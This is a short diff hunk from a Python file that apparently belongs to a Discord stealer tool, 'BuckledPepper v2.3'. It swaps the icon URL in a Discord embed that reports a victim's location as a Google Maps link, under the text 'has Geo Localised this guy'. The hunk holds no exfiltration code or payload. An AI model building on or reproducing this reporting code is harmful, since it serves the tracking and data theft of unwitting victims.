@@ -1094,7 +1094,7 @@ GoogleMaps: {self.googlemap}
                     'author': {
                         'name': f'BuckledPepper v2.3',
                         'url': 'https://github.com/Red60sapphire',
-                        'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
+                        'icon_url': 'https://cdn.discordapp.com/attachments/1156009639100555275/1156012659959922809/Screenshot_2023-09-25_182010.jpg?ex=65136c2f&is=65121aaf&hm=7a374b4714db5aaaec6d8b5726dcfd7f0c4e32dab1b8d3b1d888887d61de22af&'
                     },
                     'color': 374276,
                     'description': f'[BuckledPepper has Geo Localised this guy]({self.googlemap})',
